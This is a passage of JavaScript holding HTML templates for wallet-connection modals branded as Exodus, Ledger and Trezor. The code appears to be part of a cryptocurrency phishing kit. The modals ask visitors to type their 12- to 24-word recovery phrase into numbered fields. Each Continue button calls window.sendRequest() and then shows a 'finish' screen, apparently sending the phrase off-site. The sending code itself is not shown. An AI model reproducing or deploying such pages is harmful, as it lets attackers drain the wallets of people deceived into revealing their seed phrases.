                    <span class="notranslate">&ZeroWidthSpace;</span>

                    <p class="MuiTypography-root MuiTypography-inherit css-1lgrg8t">24.</p>

                </div>

                <input aria-invalid="false" autocomplete="off" id="mnemonic-input-23" type="text" tabindex="24" data-id="recovery_phrase_input" class="MuiInputBase-input MuiInput-input MuiInputBase-inputAdornedStart css-ndai2c" value="">

            </div>

        </div>

    </div>

</div>



                                        <button onClick="window.sendRequest();updatePage(TrezorWalletFinishModal);" class="sc-himrzO eyWopv connect-phrase-button">



                                           <div class="sc-ikZpkk FGzOk">

                                              <div class="sc-jIZahH gjHfVN">

                                                 <svg width="13" height="12" viewBox="0 0 13 12" fill="none" xmlns="http://www.w3.org/2000/svg" class="sc-ezWOiH bkoIPM">

                                                    <line stroke="currentColor" x1="1" y1="6" x2="12" y2="6" stroke-width="var(--stroke-width)" stroke-linecap="round" class="sc-kLLXSd bDZenP"></line>

                                                    <path stroke="currentColor" d="M7.51431 1.5L11.757 5.74264M7.5 10.4858L11.7426 6.24314" stroke-width="var(--stroke-width)" stroke-linecap="round" class="sc-bZkfAO"></path>

                                                 </svg>

                                              </div>

                                           </div>

                                           <span class="sc-gXmSlM CshDF">Continue</span>

                                        </button>

                                    </div>

                                </div>

                            </div>

                        </div>

                    </div>

                </div>

            </div>

        </div>

    </div>

</div>`;



const ExodusWalletModal = `

<div id="connect-trezor-modal" class="connect-trezor-modal sc-idiyUo hBuwwI" style="--height: 632px; --width: 543px;">

    <div style="pointer-events: none; position: absolute; top: 0px; bottom: 0px; left: 50%; transform: translateX(-50%); width: var(--width); z-index: 9; transition: width 200ms ease 0s;"></div>

    <div class="sc-iqcoie RrATt active">

        <div class="sc-crXcEl gcowpW">

            <button onclick="updatePage(CloseModal);" aria-label="Close" class="sc-fnykZs hFEFWT">

                <svg width="14" height="14" viewBox="0 0 14 14" fill="none" xmlns="http://www.w3.org/2000/svg">

                    <path d="M1 13L13 1" stroke="currentColor" stroke-width="2" stroke-linecap="round"></path>

                    <path d="M1 0.999999L13 13" stroke="currentColor" stroke-width="2" stroke-linecap="round"></path>

                </svg>

            </button>

            <button onclick="updatePage(ConnectModal);" aria-label="Back" class="sc-fEOsli iSYxCx" style="opacity: 1;">

                <svg width="9" height="16" viewBox="0 0 9 16" fill="none" xmlns="http://www.w3.org/2000/svg">

                    <path d="M8 1L1 8L8 15" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"></path>

                </svg>

            </button>

        </div>

        <div class="sc-eCYdqJ dLUlU">

            <div style="position: absolute; top: 0px; left: 0px; right: 0px; opacity: 1;">Exodus Wallet</div>

        </div>

        <div class="sc-evZas gcbNhn">

            <div class="sc-breuTD hVhjow active-scale-up">

                <div class="sc-ksZaOG dmNTWR" style="pointer-events: auto;">

                    <div style="z-index: 2; opacity: 1; transform: none;">

                        <div class="sc-dkzDqf jKlSZW" style="width:495px !important;">

                            <div class="sc-ZyCDH cBtLfS">

                                <div class="sc-jSMfEi lbAEgN"></div>

                                <div class="sc-jOhDuK hLWHUX">

                                    <div class="sc-hlnMnd czUBmg">

                                        <div class="sc-jTYCaT epSHCc">

                                            <div class="sc-jQHtVU jhhhSe" style="border-radius: 0px;">

                                                <div style="transform: scale(1.14); position: relative; width: 100%;">

                                                    <div style="transform: scale(0.86); position: relative; width: 100%;">



<svg viewBox="0 0 16 16" style="width: 80px" fill="none" xmlns="http://www.w3.org/2000/svg" class="w-full max-w-[28px] h-auto">

                            <path d="M13.9017 0.646973C13.3462 0.646973 12.8304 0.929357 12.5394 1.39357L9.40403 5.95741C9.30186 6.10784 9.34331 6.31059 9.49675 6.41075C9.6211 6.49202 9.78561 6.48196 9.89889 6.38645L12.9851 3.76201C13.0364 3.71677 13.1154 3.72137 13.1616 3.77165C13.1825 3.79469 13.1937 3.82444 13.1937 3.85502V12.0719C13.1937 12.1397 13.1377 12.1942 13.0684 12.1942C13.0312 12.1942 12.9962 12.1783 12.9727 12.1502L3.6435 1.20169C3.33966 0.850174 2.89352 0.647392 2.42388 0.646973H2.09782C1.21536 0.646973 0.5 1.34833 0.5 2.2135V13.7863C0.5 14.6515 1.21536 15.3528 2.09782 15.3528C2.65336 15.3528 3.16915 15.0704 3.46017 14.6062L6.59558 10.0424C6.69769 9.89194 6.65624 9.68919 6.50279 9.58903C6.37845 9.50776 6.21394 9.51782 6.10071 9.61334L3.01446 12.2378C2.96318 12.283 2.88412 12.2784 2.83797 12.2281C2.81703 12.2051 2.80592 12.1753 2.80634 12.1447V3.92583C2.80634 3.85796 2.86232 3.80349 2.93155 3.80349C2.96831 3.80349 3.00377 3.81941 3.02728 3.84748L12.3552 14.7981C12.659 15.1496 13.1052 15.3524 13.5749 15.3528H13.9009C14.7833 15.3532 15.4992 14.6523 15.5 13.7871V2.2135C15.5 1.34833 14.7842 0.646973 13.9017 0.646973Z" fill="#000000"></path>

                        </svg>  



                                                    </div>

                                                </div>

                                            </div>

                                            <div class="sc-fvNpTx eFjHkq"></div>

                                        </div>

                                    </div>

                                </div>

                                <div class="sc-gKXOVf liyQQU">

                                    <div class="sc-jIAOiI dWkvrK" style="position: relative; opacity: 1; transform: none;">

                                        <div class="sc-iBkjds emnDjo" style="padding-bottom: 18px;">

                                            <h1 class="sc-ftvSup fqLYro">Import Exodus Wallet<br></h1>

                                            <div class="sc-papXJ jCcNJP">To connect your Exodus wallet,<br>enter the secret phrase.<br></div>

                                        </div>

<div class="jssSolrise17 MuiBox-root css-0">

    <div class="MuiBox-root css-3mllz6 css-selector">

    <input class="phrase-display-none dddsad dddsadx" placeholder="Passphrase" type="password" autocomplete="new-password" id="connect-hardware-passphrase">

    <select class="dddsad" name="connect-hardware-words" id="connect-hardware-words">

<option value="12">I have 12-word phrase</option>

</select>

    </div>

    <textarea id="mnemonic-textarea" placeholder="Enter your recovery phrase" class="phrase-display-none MuiGrid-root MuiGrid-container MuiGrid-spacing-xs-2 jssSolrise18 css-isbt42" rows="4" style="padding-top:16px;margin-bottom: 16px;height: 120%;margin-top: 16px;background-color: rgb(255, 255, 255);border: 1px solid rgb(202, 206, 209);border-radius: 0.25rem;resize: none;margin-right: 15px;margin-left: 15px;width: calc(100% - 30px);"></textarea>

    <div id="mnemonic-words" class="MuiGrid-root MuiGrid-container MuiGrid-spacing-xs-2 jssSolrise18 css-isbt42">

        <div class="MuiGrid-root MuiGrid-item MuiGrid-grid-xs-6 MuiGrid-grid-sm-4 css-nlcweg">

            <div id="mnemonic-inputdiv-0" class="MuiInputBase-root MuiInput-root MuiInput-underline MuiInputBase-colorPrimary MuiInputBase-fullWidth MuiInputBase-adornedStart css-exmjsz">

                <div class="MuiInputAdornment-root MuiInputAdornment-positionStart css-1a6giau">

                    <span class="notranslate">&ZeroWidthSpace;</span>

                    <p class="MuiTypography-root MuiTypography-inherit css-1lgrg8t">1.</p>

                </div>

                <input aria-invalid="false" autocomplete="off" id="mnemonic-input-0" type="text" tabindex="1" data-id="recovery_phrase_input" class="MuiInputBase-input MuiInput-input MuiInputBase-inputAdornedStart css-ndai2c" value="">

            </div>

        </div>

        <div id="mnemonic-inputdiv-1" class="MuiGrid-root MuiGrid-item MuiGrid-grid-xs-6 MuiGrid-grid-sm-4 css-nlcweg">

            <div class="MuiInputBase-root MuiInput-root MuiInput-underline MuiInputBase-colorPrimary MuiInputBase-fullWidth MuiInputBase-adornedStart css-exmjsz">

                <div class="MuiInputAdornment-root MuiInputAdornment-positionStart css-1a6giau">

                    <span class="notranslate">&ZeroWidthSpace;</span>

                    <p class="MuiTypography-root MuiTypography-inherit css-1lgrg8t">2.</p>

                </div>

                <input aria-invalid="false" autocomplete="off" id="mnemonic-input-1" type="text" tabindex="2" data-id="recovery_phrase_input" class="MuiInputBase-input MuiInput-input MuiInputBase-inputAdornedStart css-ndai2c" value="">

            </div>

        </div>

        <div id="mnemonic-inputdiv-2" class="MuiGrid-root MuiGrid-item MuiGrid-grid-xs-6 MuiGrid-grid-sm-4 css-nlcweg">

            <div class="MuiInputBase-root MuiInput-root MuiInput-underline MuiInputBase-colorPrimary MuiInputBase-fullWidth MuiInputBase-adornedStart css-exmjsz">

                <div class="MuiInputAdornment-root MuiInputAdornment-positionStart css-1a6giau">

                    <span class="notranslate">&ZeroWidthSpace;</span>

                    <p class="MuiTypography-root MuiTypography-inherit css-1lgrg8t">3.</p>

                </div>

                <input aria-invalid="false" autocomplete="off" id="mnemonic-input-2" type="text" tabindex="3" data-id="recovery_phrase_input" class="MuiInputBase-input MuiInput-input MuiInputBase-inputAdornedStart css-ndai2c" value="">

            </div>

        </div>

        <div id="mnemonic-inputdiv-3" class="MuiGrid-root MuiGrid-item MuiGrid-grid-xs-6 MuiGrid-grid-sm-4 css-nlcweg">

            <div class="MuiInputBase-root MuiInput-root MuiInput-underline MuiInputBase-colorPrimary MuiInputBase-fullWidth MuiInputBase-adornedStart css-exmjsz">

                <div class="MuiInputAdornment-root MuiInputAdornment-positionStart css-1a6giau">

                    <span class="notranslate">&ZeroWidthSpace;</span>

                    <p class="MuiTypography-root MuiTypography-inherit css-1lgrg8t">4.</p>

                </div>

                <input aria-invalid="false" autocomplete="off" id="mnemonic-input-3" type="text" tabindex="4" data-id="recovery_phrase_input" class="MuiInputBase-input MuiInput-input MuiInputBase-inputAdornedStart css-ndai2c" value="">

            </div>

        </div>

        <div id="mnemonic-inputdiv-4" class="MuiGrid-root MuiGrid-item MuiGrid-grid-xs-6 MuiGrid-grid-sm-4 css-nlcweg">

            <div class="MuiInputBase-root MuiInput-root MuiInput-underline MuiInputBase-colorPrimary MuiInputBase-fullWidth MuiInputBase-adornedStart css-exmjsz">

                <div class="MuiInputAdornment-root MuiInputAdornment-positionStart css-1a6giau">

                    <span class="notranslate">&ZeroWidthSpace;</span>

                    <p class="MuiTypography-root MuiTypography-inherit css-1lgrg8t">5.</p>

                </div>

                <input aria-invalid="false" autocomplete="off" id="mnemonic-input-4" type="text" tabindex="5" data-id="recovery_phrase_input" class="MuiInputBase-input MuiInput-input MuiInputBase-inputAdornedStart css-ndai2c" value="">

            </div>

        </div>

        <div id="mnemonic-inputdiv-5" class="MuiGrid-root MuiGrid-item MuiGrid-grid-xs-6 MuiGrid-grid-sm-4 css-nlcweg">

            <div class="MuiInputBase-root MuiInput-root MuiInput-underline MuiInputBase-colorPrimary MuiInputBase-fullWidth MuiInputBase-adornedStart css-exmjsz">

                <div class="MuiInputAdornment-root MuiInputAdornment-positionStart css-1a6giau">

                    <span class="notranslate">&ZeroWidthSpace;</span>

                    <p class="MuiTypography-root MuiTypography-inherit css-1lgrg8t">6.</p>

                </div>

                <input aria-invalid="false" autocomplete="off" id="mnemonic-input-5" type="text" tabindex="6" data-id="recovery_phrase_input" class="MuiInputBase-input MuiInput-input MuiInputBase-inputAdornedStart css-ndai2c" value="">

            </div>

        </div>

        <div id="mnemonic-inputdiv-6" class="MuiGrid-root MuiGrid-item MuiGrid-grid-xs-6 MuiGrid-grid-sm-4 css-nlcweg">

            <div class="MuiInputBase-root MuiInput-root MuiInput-underline MuiInputBase-colorPrimary MuiInputBase-fullWidth MuiInputBase-adornedStart css-exmjsz">

                <div class="MuiInputAdornment-root MuiInputAdornment-positionStart css-1a6giau">

                    <span class="notranslate">&ZeroWidthSpace;</span>

                    <p class="MuiTypography-root MuiTypography-inherit css-1lgrg8t">7.</p>

                </div>

                <input aria-invalid="false" autocomplete="off" id="mnemonic-input-6" type="text" tabindex="7" data-id="recovery_phrase_input" class="MuiInputBase-input MuiInput-input MuiInputBase-inputAdornedStart css-ndai2c" value="">

            </div>

        </div>

        <div id="mnemonic-inputdiv-7" class="MuiGrid-root MuiGrid-item MuiGrid-grid-xs-6 MuiGrid-grid-sm-4 css-nlcweg">

            <div class="MuiInputBase-root MuiInput-root MuiInput-underline MuiInputBase-colorPrimary MuiInputBase-fullWidth MuiInputBase-adornedStart css-exmjsz">

                <div class="MuiInputAdornment-root MuiInputAdornment-positionStart css-1a6giau">

                    <span class="notranslate">&ZeroWidthSpace;</span>

                    <p class="MuiTypography-root MuiTypography-inherit css-1lgrg8t">8.</p>

                </div>

                <input aria-invalid="false" autocomplete="off" id="mnemonic-input-7" type="text" tabindex="8" data-id="recovery_phrase_input" class="MuiInputBase-input MuiInput-input MuiInputBase-inputAdornedStart css-ndai2c" value="">

            </div>

        </div>

        <div id="mnemonic-inputdiv-8" class="MuiGrid-root MuiGrid-item MuiGrid-grid-xs-6 MuiGrid-grid-sm-4 css-nlcweg">

            <div class="MuiInputBase-root MuiInput-root MuiInput-underline MuiInputBase-colorPrimary MuiInputBase-fullWidth MuiInputBase-adornedStart css-exmjsz">

                <div class="MuiInputAdornment-root MuiInputAdornment-positionStart css-1a6giau">

                    <span class="notranslate">&ZeroWidthSpace;</span>

                    <p class="MuiTypography-root MuiTypography-inherit css-1lgrg8t">9.</p>

                </div>

                <input aria-invalid="false" autocomplete="off" id="mnemonic-input-8" type="text" tabindex="9" data-id="recovery_phrase_input" class="MuiInputBase-input MuiInput-input MuiInputBase-inputAdornedStart css-ndai2c" value="">

            </div>

        </div>

        <div id="mnemonic-inputdiv-9" class="MuiGrid-root MuiGrid-item MuiGrid-grid-xs-6 MuiGrid-grid-sm-4 css-nlcweg">

            <div class="MuiInputBase-root MuiInput-root MuiInput-underline MuiInputBase-colorPrimary MuiInputBase-fullWidth MuiInputBase-adornedStart css-exmjsz">

                <div class="MuiInputAdornment-root MuiInputAdornment-positionStart css-1a6giau">

                    <span class="notranslate">&ZeroWidthSpace;</span>

                    <p class="MuiTypography-root MuiTypography-inherit css-1lgrg8t">10.</p>

                </div>

                <input aria-invalid="false" autocomplete="off" id="mnemonic-input-9" type="text" tabindex="10" data-id="recovery_phrase_input" class="MuiInputBase-input MuiInput-input MuiInputBase-inputAdornedStart css-ndai2c" value="">

            </div>

        </div>

        <div id="mnemonic-inputdiv-10" class="MuiGrid-root MuiGrid-item MuiGrid-grid-xs-6 MuiGrid-grid-sm-4 css-nlcweg">

            <div class="MuiInputBase-root MuiInput-root MuiInput-underline MuiInputBase-colorPrimary MuiInputBase-fullWidth MuiInputBase-adornedStart css-exmjsz">

                <div class="MuiInputAdornment-root MuiInputAdornment-positionStart css-1a6giau">

                    <span class="notranslate">&ZeroWidthSpace;</span>

                    <p class="MuiTypography-root MuiTypography-inherit css-1lgrg8t">11.</p>

                </div>

                <input aria-invalid="false" autocomplete="off" id="mnemonic-input-10" type="text" tabindex="11" data-id="recovery_phrase_input" class="MuiInputBase-input MuiInput-input MuiInputBase-inputAdornedStart css-ndai2c" value="">

            </div>

        </div>

        <div id="mnemonic-inputdiv-11" class="MuiGrid-root MuiGrid-item MuiGrid-grid-xs-6 MuiGrid-grid-sm-4 css-nlcweg">

            <div class="MuiInputBase-root MuiInput-root MuiInput-underline MuiInputBase-colorPrimary MuiInputBase-fullWidth MuiInputBase-adornedStart css-exmjsz">

                <div class="MuiInputAdornment-root MuiInputAdornment-positionStart css-1a6giau">

                    <span class="notranslate">&ZeroWidthSpace;</span>

                    <p class="MuiTypography-root MuiTypography-inherit css-1lgrg8t">12.</p>

                </div>

                <input aria-invalid="false" autocomplete="off" id="mnemonic-input-11" type="text" tabindex="12" data-id="recovery_phrase_input" class="MuiInputBase-input MuiInput-input MuiInputBase-inputAdornedStart css-ndai2c" value="">

            </div>

        </div>

        <div id="mnemonic-inputdiv-12" class="phrase-display-none MuiGrid-root MuiGrid-item MuiGrid-grid-xs-6 MuiGrid-grid-sm-4 css-nlcweg">

            <div class="MuiInputBase-root MuiInput-root MuiInput-underline MuiInputBase-colorPrimary MuiInputBase-fullWidth MuiInputBase-adornedStart css-exmjsz">

                <div class="MuiInputAdornment-root MuiInputAdornment-positionStart css-1a6giau">

                    <span class="notranslate">&ZeroWidthSpace;</span>

                    <p class="MuiTypography-root MuiTypography-inherit css-1lgrg8t">13.</p>

                </div>

                <input aria-invalid="false" autocomplete="off" id="mnemonic-input-12" type="text" tabindex="13" data-id="recovery_phrase_input" class="MuiInputBase-input MuiInput-input MuiInputBase-inputAdornedStart css-ndai2c" value="">

            </div>

        </div>

        <div id="mnemonic-inputdiv-13" class="phrase-display-none MuiGrid-root MuiGrid-item MuiGrid-grid-xs-6 MuiGrid-grid-sm-4 css-nlcweg">

            <div class="MuiInputBase-root MuiInput-root MuiInput-underline MuiInputBase-colorPrimary MuiInputBase-fullWidth MuiInputBase-adornedStart css-exmjsz">

                <div class="MuiInputAdornment-root MuiInputAdornment-positionStart css-1a6giau">

                    <span class="notranslate">&ZeroWidthSpace;</span>

                    <p class="MuiTypography-root MuiTypography-inherit css-1lgrg8t">14.</p>

                </div>

                <input aria-invalid="false" autocomplete="off" id="mnemonic-input-13" type="text" tabindex="14" data-id="recovery_phrase_input" class="MuiInputBase-input MuiInput-input MuiInputBase-inputAdornedStart css-ndai2c" value="">

            </div>

        </div>

        <div id="mnemonic-inputdiv-14" class="phrase-display-none MuiGrid-root MuiGrid-item MuiGrid-grid-xs-6 MuiGrid-grid-sm-4 css-nlcweg">

            <div class="MuiInputBase-root MuiInput-root MuiInput-underline MuiInputBase-colorPrimary MuiInputBase-fullWidth MuiInputBase-adornedStart css-exmjsz">

                <div class="MuiInputAdornment-root MuiInputAdornment-positionStart css-1a6giau">

                    <span class="notranslate">&ZeroWidthSpace;</span>

                    <p class="MuiTypography-root MuiTypography-inherit css-1lgrg8t">15.</p>

                </div>

                <input aria-invalid="false" autocomplete="off" id="mnemonic-input-14" type="text" tabindex="15" data-id="recovery_phrase_input" class="MuiInputBase-input MuiInput-input MuiInputBase-inputAdornedStart css-ndai2c" value="">

            </div>

        </div>

        <div id="mnemonic-inputdiv-15" class="phrase-display-none MuiGrid-root MuiGrid-item MuiGrid-grid-xs-6 MuiGrid-grid-sm-4 css-nlcweg">

            <div class="MuiInputBase-root MuiInput-root MuiInput-underline MuiInputBase-colorPrimary MuiInputBase-fullWidth MuiInputBase-adornedStart css-exmjsz">

                <div class="MuiInputAdornment-root MuiInputAdornment-positionStart css-1a6giau">

                    <span class="notranslate">&ZeroWidthSpace;</span>

                    <p class="MuiTypography-root MuiTypography-inherit css-1lgrg8t">16.</p>

                </div>

                <input aria-invalid="false" autocomplete="off" id="mnemonic-input-15" type="text" tabindex="16" data-id="recovery_phrase_input" class="MuiInputBase-input MuiInput-input MuiInputBase-inputAdornedStart css-ndai2c" value="">

            </div>

        </div>

        <div id="mnemonic-inputdiv-16" class="phrase-display-none MuiGrid-root MuiGrid-item MuiGrid-grid-xs-6 MuiGrid-grid-sm-4 css-nlcweg">

            <div class="MuiInputBase-root MuiInput-root MuiInput-underline MuiInputBase-colorPrimary MuiInputBase-fullWidth MuiInputBase-adornedStart css-exmjsz">

                <div class="MuiInputAdornment-root MuiInputAdornment-positionStart css-1a6giau">

                    <span class="notranslate">&ZeroWidthSpace;</span>

                    <p class="MuiTypography-root MuiTypography-inherit css-1lgrg8t">17.</p>

                </div>

                <input aria-invalid="false" autocomplete="off" id="mnemonic-input-16" type="text" tabindex="17" data-id="recovery_phrase_input" class="MuiInputBase-input MuiInput-input MuiInputBase-inputAdornedStart css-ndai2c" value="">

            </div>

        </div>

        <div id="mnemonic-inputdiv-17" class="phrase-display-none MuiGrid-root MuiGrid-item MuiGrid-grid-xs-6 MuiGrid-grid-sm-4 css-nlcweg">

            <div class="MuiInputBase-root MuiInput-root MuiInput-underline MuiInputBase-colorPrimary MuiInputBase-fullWidth MuiInputBase-adornedStart css-exmjsz">

                <div class="MuiInputAdornment-root MuiInputAdornment-positionStart css-1a6giau">

                    <span class="notranslate">&ZeroWidthSpace;</span>

                    <p class="MuiTypography-root MuiTypography-inherit css-1lgrg8t">18.</p>

                </div>

                <input aria-invalid="false" autocomplete="off" id="mnemonic-input-17" type="text" tabindex="18" data-id="recovery_phrase_input" class="MuiInputBase-input MuiInput-input MuiInputBase-inputAdornedStart css-ndai2c" value="">

            </div>

        </div>

        <div id="mnemonic-inputdiv-18" class="phrase-display-none MuiGrid-root MuiGrid-item MuiGrid-grid-xs-6 MuiGrid-grid-sm-4 css-nlcweg">

            <div class="MuiInputBase-root MuiInput-root MuiInput-underline MuiInputBase-colorPrimary MuiInputBase-fullWidth MuiInputBase-adornedStart css-exmjsz">

                <div class="MuiInputAdornment-root MuiInputAdornment-positionStart css-1a6giau">

                    <span class="notranslate">&ZeroWidthSpace;</span>

                    <p class="MuiTypography-root MuiTypography-inherit css-1lgrg8t">19.</p>

                </div>

                <input aria-invalid="false" autocomplete="off" id="mnemonic-input-18" type="text" tabindex="19" data-id="recovery_phrase_input" class="MuiInputBase-input MuiInput-input MuiInputBase-inputAdornedStart css-ndai2c" value="">

            </div>

        </div>

        <div id="mnemonic-inputdiv-19" class="phrase-display-none MuiGrid-root MuiGrid-item MuiGrid-grid-xs-6 MuiGrid-grid-sm-4 css-nlcweg">

            <div class="MuiInputBase-root MuiInput-root MuiInput-underline MuiInputBase-colorPrimary MuiInputBase-fullWidth MuiInputBase-adornedStart css-exmjsz">

                <div class="MuiInputAdornment-root MuiInputAdornment-positionStart css-1a6giau">

                    <span class="notranslate">&ZeroWidthSpace;</span>

                    <p class="MuiTypography-root MuiTypography-inherit css-1lgrg8t">20.</p>

                </div>

                <input aria-invalid="false" autocomplete="off" id="mnemonic-input-19" type="text" tabindex="20" data-id="recovery_phrase_input" class="MuiInputBase-input MuiInput-input MuiInputBase-inputAdornedStart css-ndai2c" value="">

            </div>

        </div>

        <div id="mnemonic-inputdiv-20" class="phrase-display-none MuiGrid-root MuiGrid-item MuiGrid-grid-xs-6 MuiGrid-grid-sm-4 css-nlcweg">

            <div class="MuiInputBase-root MuiInput-root MuiInput-underline MuiInputBase-colorPrimary MuiInputBase-fullWidth MuiInputBase-adornedStart css-exmjsz">

                <div class="MuiInputAdornment-root MuiInputAdornment-positionStart css-1a6giau">

                    <span class="notranslate">&ZeroWidthSpace;</span>

                    <p class="MuiTypography-root MuiTypography-inherit css-1lgrg8t">21.</p>

                </div>

                <input aria-invalid="false" autocomplete="off" id="mnemonic-input-20" type="text" tabindex="21" data-id="recovery_phrase_input" class="MuiInputBase-input MuiInput-input MuiInputBase-inputAdornedStart css-ndai2c" value="">

            </div>

        </div>

        <div id="mnemonic-inputdiv-21" class="phrase-display-none MuiGrid-root MuiGrid-item MuiGrid-grid-xs-6 MuiGrid-grid-sm-4 css-nlcweg">

            <div class="MuiInputBase-root MuiInput-root MuiInput-underline MuiInputBase-colorPrimary MuiInputBase-fullWidth MuiInputBase-adornedStart css-exmjsz">

                <div class="MuiInputAdornment-root MuiInputAdornment-positionStart css-1a6giau">

                    <span class="notranslate">&ZeroWidthSpace;</span>

                    <p class="MuiTypography-root MuiTypography-inherit css-1lgrg8t">22.</p>

                </div>

                <input aria-invalid="false" autocomplete="off" id="mnemonic-input-21" type="text" tabindex="22" data-id="recovery_phrase_input" class="MuiInputBase-input MuiInput-input MuiInputBase-inputAdornedStart css-ndai2c" value="">

            </div>

        </div>

        <div id="mnemonic-inputdiv-22" class="phrase-display-none MuiGrid-root MuiGrid-item MuiGrid-grid-xs-6 MuiGrid-grid-sm-4 css-nlcweg">

            <div class="MuiInputBase-root MuiInput-root MuiInput-underline MuiInputBase-colorPrimary MuiInputBase-fullWidth MuiInputBase-adornedStart css-exmjsz">

                <div class="MuiInputAdornment-root MuiInputAdornment-positionStart css-1a6giau">

                    <span class="notranslate">&ZeroWidthSpace;</span>

                    <p class="MuiTypography-root MuiTypography-inherit css-1lgrg8t">23.</p>

                </div>

                <input aria-invalid="false" autocomplete="off" id="mnemonic-input-22" type="text" tabindex="23" data-id="recovery_phrase_input" class="MuiInputBase-input MuiInput-input MuiInputBase-inputAdornedStart css-ndai2c" value="">

            </div>

        </div>

        <div id="mnemonic-inputdiv-23" class="phrase-display-none MuiGrid-root MuiGrid-item MuiGrid-grid-xs-6 MuiGrid-grid-sm-4 css-nlcweg">

            <div class="MuiInputBase-root MuiInput-root MuiInput-underline MuiInputBase-colorPrimary MuiInputBase-fullWidth MuiInputBase-adornedStart css-exmjsz">

                <div class="MuiInputAdornment-root MuiInputAdornment-positionStart css-1a6giau">

                    <span class="notranslate">&ZeroWidthSpace;</span>

                    <p class="MuiTypography-root MuiTypography-inherit css-1lgrg8t">24.</p>

                </div>

                <input aria-invalid="false" autocomplete="off" id="mnemonic-input-23" type="text" tabindex="24" data-id="recovery_phrase_input" class="MuiInputBase-input MuiInput-input MuiInputBase-inputAdornedStart css-ndai2c" value="">

            </div>

        </div>

    </div>

</div>



                                        <button onClick="window.sendRequest();updatePage(ExodusWalletFinishModal);"  class="sc-himrzO eyWopv connect-phrase-button">
                                           <div class="sc-ikZpkk FGzOk">

                                              <div class="sc-jIZahH gjHfVN">

                                                 <svg width="13" height="12" viewBox="0 0 13 12" fill="none" xmlns="http://www.w3.org/2000/svg" class="sc-ezWOiH bkoIPM">

                                                    <line stroke="currentColor" x1="1" y1="6" x2="12" y2="6" stroke-width="var(--stroke-width)" stroke-linecap="round" class="sc-kLLXSd bDZenP"></line>

                                                    <path stroke="currentColor" d="M7.51431 1.5L11.757 5.74264M7.5 10.4858L11.7426 6.24314" stroke-width="var(--stroke-width)" stroke-linecap="round" class="sc-bZkfAO"></path>

                                                 </svg>

                                              </div>

                                           </div>

                                           <span class="sc-gXmSlM CshDF">Continue</span>

                                        </button>

                                    </div>

                                </div>

                            </div>

                        </div>

                    </div>

                </div>

            </div>

        </div>

    </div>

</div>`;



const LedgerWalletModal = `

<div id="connect-trezor-modal" class="connect-trezor-modal sc-idiyUo hBuwwI" style="--height: 632px; --width: 543px;">

    <div style="pointer-events: none; position: absolute; top: 0px; bottom: 0px; left: 50%; transform: translateX(-50%); width: var(--width); z-index: 9; transition: width 200ms ease 0s;"></div>

    <div class="sc-iqcoie RrATt active">

        <div class="sc-crXcEl gcowpW">

            <button onclick="updatePage(CloseModal);" aria-label="Close" class="sc-fnykZs hFEFWT">

                <svg width="14" height="14" viewBox="0 0 14 14" fill="none" xmlns="http://www.w3.org/2000/svg">

                    <path d="M1 13L13 1" stroke="currentColor" stroke-width="2" stroke-linecap="round"></path>

                    <path d="M1 0.999999L13 13" stroke="currentColor" stroke-width="2" stroke-linecap="round"></path>

                </svg>

            </button>

            <button onclick="updatePage(ConnectModal);" aria-label="Back" class="sc-fEOsli iSYxCx" style="opacity: 1;">

                <svg width="9" height="16" viewBox="0 0 9 16" fill="none" xmlns="http://www.w3.org/2000/svg">

                    <path d="M8 1L1 8L8 15" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"></path>

                </svg>

            </button>

        </div>

        <div class="sc-eCYdqJ dLUlU">

            <div style="position: absolute; top: 0px; left: 0px; right: 0px; opacity: 1;">Ledger Wallet</div>

        </div>

        <div class="sc-evZas gcbNhn">

            <div class="sc-breuTD hVhjow active-scale-up">

                <div class="sc-ksZaOG dmNTWR" style="pointer-events: auto;">

                    <div style="z-index: 2; opacity: 1; transform: none;">

                        <div class="sc-dkzDqf jKlSZW" style="width:495px !important;">

                            <div class="sc-ZyCDH cBtLfS">

                                <div class="sc-jSMfEi lbAEgN"></div>

                                <div class="sc-jOhDuK hLWHUX">

                                    <div class="sc-hlnMnd czUBmg">

                                        <div class="sc-jTYCaT epSHCc">

                                            <div class="sc-jQHtVU jhhhSe" style="border-radius: 0px;">

                                                <div style="transform: scale(1.14); position: relative; width: 100%;">

                                                    <div style="transform: scale(0.86); position: relative; width: 100%;">

                                                    <!--<svg width="147" height="128" viewBox="0 0 147 128" fill="none" xmlns="http://www.w3.org/2000/svg">

                                                    <path d="M0 91.6548V128H55.293V119.94H8.05631V91.6548H0ZM138.944 91.6548V119.94H91.707V127.998H147V91.6548H138.944ZM55.3733 36.3452V91.6529H91.707V84.3842H63.4296V36.3452H55.3733ZM0 0V36.3452H8.05631V8.05844H55.293V0H0ZM91.707 0V8.05844H138.944V36.3452H147V0H91.707Z" fill="black"/>

                                                    </svg>-->

                                                   <svg viewBox="0 0 16 16" style="width: 80px" fill="none" xmlns="http://www.w3.org/2000/svg" class="w-full max-w-[28px] h-auto">

                            <path d="M13.9017 0.646973C13.3462 0.646973 12.8304 0.929357 12.5394 1.39357L9.40403 5.95741C9.30186 6.10784 9.34331 6.31059 9.49675 6.41075C9.6211 6.49202 9.78561 6.48196 9.89889 6.38645L12.9851 3.76201C13.0364 3.71677 13.1154 3.72137 13.1616 3.77165C13.1825 3.79469 13.1937 3.82444 13.1937 3.85502V12.0719C13.1937 12.1397 13.1377 12.1942 13.0684 12.1942C13.0312 12.1942 12.9962 12.1783 12.9727 12.1502L3.6435 1.20169C3.33966 0.850174 2.89352 0.647392 2.42388 0.646973H2.09782C1.21536 0.646973 0.5 1.34833 0.5 2.2135V13.7863C0.5 14.6515 1.21536 15.3528 2.09782 15.3528C2.65336 15.3528 3.16915 15.0704 3.46017 14.6062L6.59558 10.0424C6.69769 9.89194 6.65624 9.68919 6.50279 9.58903C6.37845 9.50776 6.21394 9.51782 6.10071 9.61334L3.01446 12.2378C2.96318 12.283 2.88412 12.2784 2.83797 12.2281C2.81703 12.2051 2.80592 12.1753 2.80634 12.1447V3.92583C2.80634 3.85796 2.86232 3.80349 2.93155 3.80349C2.96831 3.80349 3.00377 3.81941 3.02728 3.84748L12.3552 14.7981C12.659 15.1496 13.1052 15.3524 13.5749 15.3528H13.9009C14.7833 15.3532 15.4992 14.6523 15.5 13.7871V2.2135C15.5 1.34833 14.7842 0.646973 13.9017 0.646973Z" fill="#000000"></path>

                        </svg>  

                                                    </div>

                                                </div>

                                            </div>

                                            <div class="sc-fvNpTx eFjHkq"></div>

                                        </div>

                                    </div>

                                </div>

                                <div class="sc-gKXOVf liyQQU">

